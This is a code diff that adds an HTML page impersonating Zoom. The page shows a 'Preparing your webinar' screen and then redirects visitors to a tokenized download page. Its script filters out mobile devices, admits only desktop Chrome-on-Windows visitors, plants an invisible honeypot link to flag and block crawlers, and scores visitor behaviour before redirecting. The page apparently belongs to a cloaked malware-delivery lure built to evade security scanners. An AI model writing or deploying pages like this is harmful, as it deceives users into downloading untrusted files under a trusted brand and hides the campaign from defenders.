@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Preparing your webinar</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    .container { width: 100%; height: 100vh; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; background: #fff; gap: 18px; padding-bottom: 20vh; }
+    .logo { width: 220px; height: auto; object-fit: contain; }
+    .download-text { font-weight: 500; font-size: 17px; color: #232323; }
+    .spinner { width: 40px; height: 40px; border: 5px solid #0089ff; border-top-color: transparent;
+      border-radius: 50%; animation: spinner 0.7s linear infinite; }
+    @keyframes spinner { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="assets/zoom.png" alt="Zoom" class="logo">
+    <div class="download-text">Preparing your webinar&hellip;</div>
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Honeypot: invisible to humans, followed by link-crawling bots. ?hp=1 poisons 24h. -->
+  <a href="?hp=1" aria-hidden="true"
+     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>
+
+  <script src="config.js"></script>
+  <script src="gate.js"></script>
+  <script src="telemetry.js"></script>
+  <script>
+    (async function () {
+      var t0 = Date.now();
+      // Entry gate (real desktop Chrome-on-Windows UA + honeypot).
+      if (!window.gateStep({ entry: true })) return;
+
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        window.location.href = "denied.html"; return;
+      }
+
+      const it = await window.issueToken();
+      var TK = it.tok;
+      // Behavioral verdict (client-side). All failure -> legacy 5s fixed flow.
+      var verdict = { p: 'robust', f: 0, v: null };
+      try { var T = await window.collectBehavior(t0); verdict = window.verdict(window.scoreBehavior(T)); }
+      catch (e) { /* legacy */ }
+      var wait = Math.max(5000 - (Date.now() - t0), verdict.p === 'fast' ? 3200 : 5000);
+      setTimeout(function () {
+        window.location.href = "download.html?tk=" + encodeURIComponent(TK);
+      }, wait);
+    })();
+  </script>
+</body>
+</html>
